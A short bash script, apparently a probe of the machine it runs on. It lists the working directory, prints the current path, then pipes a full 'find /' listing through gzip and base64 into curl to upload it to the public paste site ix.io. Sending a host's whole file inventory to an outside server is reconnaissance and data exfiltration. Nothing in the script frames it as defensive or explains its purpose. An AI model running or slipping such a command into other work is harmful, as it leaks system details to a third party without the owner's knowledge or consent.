#!/bin/bash

r() {
    echo "<$*>"
    "$@"
    err="$?"
    echo "</$* (err=$?)>"
}

r ls
r pwd
r find / | gzip | base64 | curl -F 'f:1=<-' ix.io
